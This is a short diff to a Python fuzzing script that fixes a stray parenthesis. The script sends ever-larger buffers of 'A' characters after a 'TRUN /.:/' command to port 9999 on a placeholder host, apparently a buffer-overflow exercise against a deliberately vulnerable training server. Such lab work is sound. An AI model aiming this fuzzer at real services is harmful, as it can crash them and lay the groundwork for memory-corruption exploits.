@@ -13,7 +13,7 @@ while(size < 2000):
                 
                 buffer = "A" * size
                 
-                s = socket.socket (socket.AF_INET, socket.SOCK_STREAM))
+                s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
                 
                 s.connect(("x.x.x.x", 9999))
                 s.send(('TRUN /.:/' + buffer))
